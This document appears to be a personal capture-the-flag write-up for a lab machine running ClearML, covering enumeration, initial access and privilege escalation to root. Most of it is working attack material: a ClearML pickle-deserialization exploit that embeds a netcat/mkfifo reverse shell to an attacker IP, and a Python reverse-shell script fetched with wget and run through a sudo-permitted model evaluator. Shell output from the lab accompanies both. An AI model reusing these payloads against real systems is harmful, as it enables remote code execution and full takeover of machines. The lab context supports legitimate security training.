# export ip=`10.10.11.19`

# Date 13-05-24 || Rohit Tiwari

# Nmap_Scan

```<>
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  tcpwrapped
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
```

# Sytem info
- Nginx 1.18.0 {Server}
- OS maybe linux version and distribution unknown
# Port 80
- [x] fuzzing  not need
- [x] source code
- [x] manual enumeration
- [x] `robots.txt` (not available)
- [x] subdomain find

> On interacting with port 80 found

![](Attachments/Pasted%20image%2020240614000853.png)

Found a login page of clearmL

![](Attachments/Pasted%20image%2020240614001118.png)

> On researching about found 
![](Attachments/Pasted%20image%2020240614001355.png)
> okay so on searching about ClearML vulnerability on goggle found some vul as pickle on load vulnerability which can cause to run arbitary code on machine


> Okay so add every host to /etc/hosts

### Initial foothold

> Tried googling about clearml exploit found some  rce tried but no luck then found one explloit that wokks

```<>
import os
from clearml import Task
import base64
import time

task = Task.init(project_name='Black Swan', task_name='Generate and Upload Pickle', tags=["review"], task_type=Task.TaskTypes.data_processing)

class Pickle:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.72 7070 >/tmp/f"
        return os.system, (cmd,)

rng_name = base64.b64encode(str(time.time()).encode()).decode()
task.upload_artifact(name=rng_name, artifact_object=Pickle())

task.execute_remotely(queue_name='default')
```
>Break down of code
```
The line rng_name = base64.b64encode(str(time.time()).encode()).decode() is a compound operation that creates a unique name by encoding the current time in base64. Here is a detailed breakdown of each step:

time.time():

This function call retrieves the current time in seconds since the epoch (January 1, 1970, 00:00:00 UTC) as a floating-point number.
Example output: 1686755817.4592237.
str(time.time()):

Converts the floating-point number representing the current time to a string.
Example output: "1686755817.4592237".
.encode():

Encodes the string into bytes using UTF-8 encoding.
Example output: b'1686755817.4592237'.
base64.b64encode(...):

Encodes the byte string using Base64 encoding, which is used to represent binary data in an ASCII string format.
Example output: b'MTY4Njc1NTgxNy40NTkyMjM3'.
.decode():

Decodes the Base64-encoded byte string back into a regular string.
Example output: "MTY4Njc1NTgxNy40NTkyMjM3".
Purpose
The purpose of this compound operation is to generate a unique, human-readable string based on the current time, encoded in a way that ensures it is URL-safe and filesystem-safe. This is useful for creating unique identifiers, filenames, or artifact names that are unlikely to collide with others.
```

>summuary this rng is used to createa artifcate name that is unique and it uses date and time to uniquely avoids naming conflicts



Got a shell
![](Attachments/Pasted%20image%2020240614141351.png)


> Then stable the shell

# Got root

![](Attachments/Pasted%20image%2020240614142731.png)

Steps to get root

```
jippity@blurry:/models$ sudo -l
```

> Then check the ooutput

```bash
atching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

> from this got to know that user can run evaluate_model.py as root

>so created a evaluate_model.py script with revershell and upload it to /models/evaluate_model.py
>

```
vi evaluate_model.py
```

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.72", 2929))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("sh")
```

```
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.19 - - [14/Jun/2024 14:26:36] "GET /evaluate_model.py HTTP/1.1" 200 -
```

```
jippity@blurry:/models$ wget  http://10.10.16.72:80/evaluate_model.py .
--2024-06-14 04:56:35--  http://10.10.16.72/evaluate_model.py
Connecting to 10.10.16.72:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 226 [text/x-python]
Saving to: ‘evaluate_model.py’

evaluate_model.py   100%[===================>]     226  --.-KB/s    in 0s      

2024-06-14 04:56:37 (26.8 MB/s) - ‘evaluate_model.py’ saved [226/226]
```
>on attacker machine
```
nc -lnvp 2929
```

>on target machine

```
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/*.pth
[+] Model /models/demo_model.pth is considered safe. Processing...
```


Got shell

```
listening on [any] 2929 ...
connect to [10.10.16.72] from (UNKNOWN) [10.10.11.19] 59196
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```


Payload was used from https://www.revshells.com/

![](Attachments/Pasted%20image%2020240614143814.png)

